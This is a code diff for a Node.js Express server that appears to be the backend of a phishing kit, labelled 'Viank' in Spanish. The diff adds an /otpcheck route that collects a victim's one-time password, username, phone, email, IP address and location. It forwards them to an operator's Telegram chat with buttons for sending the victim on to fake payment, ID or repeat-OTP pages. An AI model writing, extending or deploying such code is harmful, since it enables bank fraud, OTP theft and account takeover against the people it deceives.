@@ -132,6 +132,54 @@ app.post('/idcheck', async (req, res) => {
   }
 });
 
+// ✅ Ruta para otp-check.html
+app.post('/otpcheck', async (req, res) => {
+  try {
+    const data = req.body;
+    const sessionId = data.sessionId;
+
+    const text = `
+🟣Viank🟣 - |[otp-check]|
+---
+🔐 VERIFICACIÓN OTP
+
+• OTP: ${data.otp || 'N/D'}
+• Usuario: ${data.user || 'N/D'}
+• Teléfono: ${data.telnum || 'N/D'}
+• Email: ${data.email || 'N/D'}
+• IP: ${data.ip || 'N/D'}
+• Ubicación: ${data.location || 'N/D'}
+
+🆔 sessionId: ${sessionId}
+---`.trim();
+
+    const reply_markup = {
+      inline_keyboard: [
+        [
+          { text: '❌ Error Tarjeta', callback_data: `go:payment.html|${sessionId}` },
+          { text: '⚠️ Error Logo',   callback_data: `go:id-check.html|${sessionId}` }
+        ],
+        [
+          { text: '🔁 Error OTP',     callback_data: `go:otp-check2.html|${sessionId}` },
+          { text: '✅ Finalizar',     callback_data: `go:finish.html|${sessionId}` }
+        ]
+      ]
+    };
+
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text,
+      reply_markup
+    });
+
+    res.status(200).send({ ok: true });
+  } catch (err) {
+    console.error('Error en /otpcheck:', err?.response?.data || err.message);
+    res.status(500).send({ ok: false, error: 'telegram_send_failed' });
+  }
+});
+
+
 // ✅ Webhook de Telegram para botones dinámicos
 app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
   try {
